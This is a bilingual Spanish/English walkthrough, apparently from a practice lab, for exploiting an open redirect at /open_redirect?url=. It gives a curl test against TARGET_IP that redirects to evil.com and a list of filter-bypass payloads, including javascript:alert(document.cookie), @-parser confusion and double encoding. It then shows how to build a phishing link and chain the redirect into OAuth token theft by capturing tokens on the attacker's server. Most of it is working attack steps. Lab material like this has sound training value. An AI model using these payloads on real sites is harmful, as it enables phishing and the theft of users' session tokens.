Este portal redirige a los usuarios tras completar acciones. El parámetro de destino no está validado.

Pasos de explotación

  1. Identifica el endpoint vulnerable: /open_redirect?url= acepta una URL y redirige al usuario a ella sin validación.
  2. Comprueba la redirección básica con curl: 
    curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"
    Busca la cabecera Location: https://evil.com en la respuesta HTTP 302.
  3. Prueba técnicas de bypass según el nivel de dificultad: 
    # Protocol-relative (bypass Medium)
/open_redirect?url=//evil.com

# Backslash (bypass Medium)
/open_redirect?url=/\evil.com

# Protocolo javascript (bypass Medium)
/open_redirect?url=javascript:alert(document.cookie)

# URL con @ para confundir el parser (bypass Hard)
/open_redirect?url=https://trusted.com@evil.com

# Tab/whitespace antes del dominio (bypass Hard)
/open_redirect?url=//	evil.com

# Doble URL encoding (bypass Hard) 
/open_redirect?url=%2f%2fevil.com
  4. Usa Burp Suite Repeater para probar los diferentes payloads: 
    GET /open_redirect?url=//evil.com HTTP/1.1
Host: TARGET_IP
  5. Construye un enlace de phishing creíble combinando el dominio legítimo con el redirect: 
    http://TARGET_IP/open_redirect?url=https://evil.com/login
    La víctima ve el dominio de confianza y hace clic, pero termina en el sitio del atacante.
  6. Encadena con robo de tokens OAuth: si la aplicación tiene un flujo de autenticación, usa el open redirect como redirect_uri para capturar el token de sesión en tu servidor.

Exploitation Steps

  1. Identify the vulnerable endpoint: /open_redirect?url= takes a URL and redirects the user to it without validation.
  2. Verify the basic redirect with curl: 
    curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"
    Look for the Location: https://evil.com header in the HTTP 302 response.
  3. Test bypass techniques based on difficulty level: 
    # Protocol-relative (bypasses Medium)
/open_redirect?url=//evil.com

# Backslash (bypasses Medium)
/open_redirect?url=/\evil.com

# Javascript protocol (bypasses Medium)
/open_redirect?url=javascript:alert(document.cookie)

# URL with @ to confuse the parser (bypasses Hard)
/open_redirect?url=https://trusted.com@evil.com

# Tab/whitespace before domain (bypasses Hard)
/open_redirect?url=//	evil.com

# Double URL encoding (bypasses Hard)
/open_redirect?url=%2f%2fevil.com
  4. Use Burp Suite Repeater to test different payloads: 
    GET /open_redirect?url=//evil.com HTTP/1.1
Host: TARGET_IP
  5. Craft a convincing phishing link combining the trusted domain with the redirect: 
    http://TARGET_IP/open_redirect?url=https://evil.com/login
    The victim sees the trusted domain and clicks, but ends up on the attacker's site.
  6. Chain with OAuth token theft: if the app has an auth flow, use the open redirect as the redirect_uri to capture the session token on your server.
